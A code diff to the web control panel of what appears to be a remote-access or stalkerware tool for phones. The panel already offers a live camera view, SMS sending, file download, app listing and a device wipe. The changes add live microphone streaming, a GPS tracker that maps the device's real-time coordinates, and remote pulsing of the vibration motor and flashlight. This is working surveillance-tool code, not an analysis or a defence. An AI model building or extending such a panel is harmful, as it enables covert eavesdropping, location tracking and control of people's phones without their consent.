@@ -279,6 +279,19 @@
         .app-pkg-text { font-size: 0.7rem; color: var(--text-dim); font-family: monospace; }
         .app-type-tag { font-size: 0.6rem; color: #f59e0b; margin-top: 2px; }
 
+        #locationDisplay {
+            background: rgba(56, 189, 248, 0.1);
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border: 1px solid var(--border);
+            display: none;
+        }
+        .location-title { font-size: 0.85rem; font-weight: 700; color: var(--accent); margin-bottom: 4px; display: flex; align-items: center; gap: 5px; }
+        .location-text { font-family: monospace; font-size: 0.9rem; color: var(--text-main); }
+        .maps-btn { display: inline-block; margin-top: 8px; color: var(--accent); text-decoration: none; font-size: 0.75rem; font-weight: 600; border: 1px solid var(--accent); padding: 4px 8px; border-radius: 4px; }
+        .maps-btn:hover { background: var(--accent); color: #0f172a; }
+
     </style>
 </head>
 <body>
@@ -339,6 +352,7 @@
                     <div class="live-screen-container">
                         <div id="camSpinner" class="spinner"></div>
                         <img id="liveScreen" class="rotate-0" src="" alt="Stream Offline" />
+                        <audio id="liveAudio" autoplay></audio>
                     </div>
                 </div>
 
@@ -350,14 +364,31 @@
                         <button class="action" style="flex: 1;" onclick="safeReboot()">REBOOT</button>
                         <button style="flex: 1; background: #991b1b;" onclick="safeWipe()">WIPE</button>
                     </div>
-                    <hr>
+                </div>
+
+                <!-- Vibration & Flashlight -->
+                <div class="card">
+                    <h2>Vibrate & Flashlight</h2>
                     <div class="control-group" style="flex-direction: column; align-items: stretch; border-bottom: none; padding-bottom: 0;">
                         <label>Vibration Control</label>
                         <div class="flex-row" style="margin-top:5px;">
-                            <input type="number" id="vibrateDur" placeholder="ms (empty=forever)">
+                            <input type="number" id="vibrateOn" placeholder="ON (ms)">
+                            <input type="number" id="vibrateOff" placeholder="OFF (ms)">
                             <div class="btn-toggle">
                                 <button id="btn_vibrate_on" onclick="handleVibrate(true)">ON</button>
                                 <button id="btn_vibrate_off" onclick="handleVibrate(false)">OFF</button>
+                            </div>
+                        </div>
+                    </div>
+                    <hr>
+                    <div class="control-group" style="flex-direction: column; align-items: stretch; border-bottom: none;">
+                        <label>Flashlight Control</label>
+                        <div class="flex-row" style="margin-top:5px;">
+                            <input type="number" id="flashlightOn" placeholder="ON (ms)">
+                            <input type="number" id="flashlightOff" placeholder="OFF (ms)">
+                            <div class="btn-toggle">
+                                <button id="btn_flashlight_on" onclick="handleFlashlight(true)">ON</button>
+                                <button id="btn_flashlight_off" onclick="handleFlashlight(false)">OFF</button>
                             </div>
                         </div>
                     </div>
@@ -400,14 +431,6 @@
                         <input type="text" id="smsMsg" placeholder="Message">
                         <button class="action" onclick="sendCommand('sms', {number: document.getElementById('smsNumber').value, message: document.getElementById('smsMsg').value})">Send</button>
                     </div>
-                    <hr>
-                    <label>Record Audio</label>
-                    <div class="flex-row">
-                        <input type="number" id="recDur" value="10000" placeholder="ms">
-                        <button class="action" onclick="sendCommand('record_audio', {duration: parseInt(document.getElementById('recDur').value)})">Record</button>
-                    </div>
-                    <hr>
-                    <button class="action" style="width: 100%;" onclick="sendCommand('location')">GET GPS LOCATION</button>
                 </div>
 
                 <!-- Hardware Control -->
@@ -439,16 +462,6 @@
                         <div class="btn-toggle">
                             <button id="btn_bluetooth_allow" onclick="sendCommand('bluetooth_disable', {disabled: false})">Allow</button>
                             <button id="btn_bluetooth_block" onclick="sendCommand('bluetooth_disable', {disabled: true})">Block</button>
-                        </div>
-                    </div>
-                    <div class="control-group" style="flex-direction: column; align-items: stretch; border-bottom: none;">
-                        <label>Flashlight Control</label>
-                        <div class="flex-row" style="margin-top:5px;">
-                            <input type="number" id="flashlightDur" placeholder="ms (empty=forever)">
-                            <div class="btn-toggle">
-                                <button id="btn_flashlight_on" onclick="handleFlashlight(true)">ON</button>
-                                <button id="btn_flashlight_off" onclick="handleFlashlight(false)">OFF</button>
-                            </div>
                         </div>
                     </div>
                 </div>
@@ -557,6 +570,13 @@
                     </div>
                     <button class="action" style="width: 100%;" onclick="sendCommand('download_file', {path: document.getElementById('filePath').value})">Download File</button>
                 </div>
+
+                <!-- GPS Tracker (Last) -->
+                <div class="card">
+                    <h2>GPS Tracker</h2>
+                    <p style="font-size: 0.75rem; color: var(--text-dim); margin-bottom: 12px;">Fetch device's real-time coordinates.</p>
+                    <button class="action" style="width: 100%; padding: 12px;" onclick="sendCommand('location')">GET GPS LOCATION</button>
+                </div>
             </div>
 
             <div class="card">
@@ -564,6 +584,13 @@
                     <h2>System Data & Responses</h2>
                     <span id="lastUpdated" style="font-size: 0.7rem; color: var(--text-dim);"></span>
                 </div>
+
+                <div id="locationDisplay">
+                    <div class="location-title">📍 Last Known Location:</div>
+                    <div id="locationCoords" class="location-text"></div>
+                    <a id="mapsLink" href="#" target="_blank" class="maps-btn">View on Google Maps</a>
+                </div>
+
                 <pre id="logs">Connecting...</pre>
             </div>
         </div>
@@ -611,6 +638,7 @@
             const camId = document.getElementById('cameraIdSelect').value;
             const spinner = document.getElementById('camSpinner');
             const img = document.getElementById('liveScreen');
+            const audio = document.getElementById('liveAudio');
 
             if (enable) {
                 isFeedEnabled = true;
@@ -623,11 +651,17 @@
                     window.streamLoopRunning = true;
                     updateLiveStream();
                 }
+
+                // Audio setup
+                const deviceId = document.getElementById('deviceSelect').value;
+                audio.src = `/live-audio?deviceId=${deviceId}&t=${Date.now()}`;
+                audio.play().catch(e => console.log("Audio autoplay blocked"));
             } else {
                 isFeedEnabled = false;
                 spinner.style.display = 'none';
                 img.style.display = 'none';
                 img.src = "";
+                audio.src = "";
                 await sendCommand('live_camera', {enabled: false});
             }
 
@@ -703,7 +737,19 @@
                     if (document.getElementById('logs').innerText !== newLog) {
                         document.getElementById('logs').innerText = newLog;
                         document.getElementById('lastUpdated').innerText = "Updated: " + new Date().toLocaleTimeString();
-                        if (data.response && data.response.apps) renderAppsList(data.response.apps);
+
+                        if (data.response) {
+                            if (data.response.apps) renderAppsList(data.response.apps);
+
+                            // Specific Location Response Handling
+                            if (data.response.lat && data.response.lng) {
+                                document.getElementById('locationDisplay').style.display = 'block';
+                                document.getElementById('locationCoords').innerText = `Latitude: ${data.response.lat}, Longitude: ${data.response.lng}`;
+                                document.getElementById('mapsLink').href = `https://www.google.com/maps?q=${data.response.lat},${data.response.lng}`;
+                            } else {
+                                document.getElementById('locationDisplay').style.display = 'none';
+                            }
+                        }
                     }
                     if (!isCoolingDown) {
                         const s = data.status;
@@ -732,13 +778,23 @@
         }
 
         function handleFlashlight(on) {
-            const dur = document.getElementById('flashlightDur').value;
-            sendCommand('flashlight', { enabled: on, duration: (on && dur) ? parseInt(dur) : (on ? -1 : 0) });
+            const onMs = document.getElementById('flashlightOn').value;
+            const offMs = document.getElementById('flashlightOff').value;
+            sendCommand('flashlight', {
+                enabled: on,
+                onMs: on ? parseInt(onMs || 0) : 0,
+                offMs: on ? parseInt(offMs || 0) : 0
+            });
         }
 
         function handleVibrate(on) {
-            const dur = document.getElementById('vibrateDur').value;
-            sendCommand('vibrate', { enabled: on, duration: (on && dur) ? parseInt(dur) : (on ? -1 : 0) });
+            const onMs = document.getElementById('vibrateOn').value;
+            const offMs = document.getElementById('vibrateOff').value;
+            sendCommand('vibrate', {
+                enabled: on,
+                onMs: on ? parseInt(onMs || 0) : 0,
+                offMs: on ? parseInt(offMs || 0) : 0
+            });
         }
 
         async function sendCommand(action, params = {}) {
